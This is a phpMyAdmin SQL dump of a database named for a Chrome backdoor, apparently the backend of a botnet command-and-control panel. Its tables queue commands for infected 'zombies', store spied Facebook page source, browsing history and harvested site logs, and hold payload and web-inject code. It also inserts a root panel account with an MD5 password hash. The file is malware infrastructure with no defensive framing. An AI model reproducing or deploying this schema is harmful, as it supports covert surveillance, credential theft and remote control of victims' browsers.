-- phpMyAdmin SQL Dump
-- version 4.0.10.7
-- http://www.phpmyadmin.net
--
-- Client: localhost:3306
-- Généré le: Lun 11 Avril 2016 à 14:19
-- Version du serveur: 5.5.48-cll
-- Version de PHP: 5.4.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de données: `zozqrvae_chromebackdoor`
--

-- --------------------------------------------------------

--
-- Structure de la table `action_wait`
--

CREATE TABLE IF NOT EXISTS `action_wait` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `zombie_name` text NOT NULL,
  `commande` text NOT NULL,
  `used` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `bots`
--

CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `backdoor_name` text NOT NULL,
  `numbers_logs` int(11) NOT NULL DEFAULT '0',
  `online` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `bot_settings`
--

CREATE TABLE IF NOT EXISTS `bot_settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `setting_name` text NOT NULL,
  `setting_value` text NOT NULL,
  `bot_id` text NOT NULL,
  `available` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `facebookspy`
--

CREATE TABLE IF NOT EXISTS `facebookspy` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` int(11) NOT NULL,
  `source_code` longtext NOT NULL,
  `new` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `history_web`
--

CREATE TABLE IF NOT EXISTS `history_web` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `website` text NOT NULL,
  `zombie` text NOT NULL,
  `timevisit` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `logs_checker`
--

CREATE TABLE IF NOT EXISTS `logs_checker` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `id_zombie` int(11) NOT NULL,
  `url_site` text NOT NULL,
  `logs_site` text NOT NULL,
  `last` int(11) DEFAULT '0',
  `zombie` text NOT NULL,
  `webinject` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `payloads`
--

CREATE TABLE IF NOT EXISTS `payloads` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `urlverif` text NOT NULL,
  `codeinject` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Structure de la table `utilisateurs`
--

CREATE TABLE IF NOT EXISTS `utilisateurs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` text NOT NULL,
  `password` varchar(255) NOT NULL,
  `bot` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Contenu de la table `utilisateurs`
--

INSERT INTO `utilisateurs` (`id`, `username`, `password`, `bot`) VALUES
(1, 'root', '7b24afc8bc80e548d66c4e7ff72171c5', 0);

-- --------------------------------------------------------

--
-- Structure de la table `webinject`
--

CREATE TABLE IF NOT EXISTS `webinject` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `webinject_site` text NOT NULL,
  `webinject_code` text NOT NULL,
  `webinject_status` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
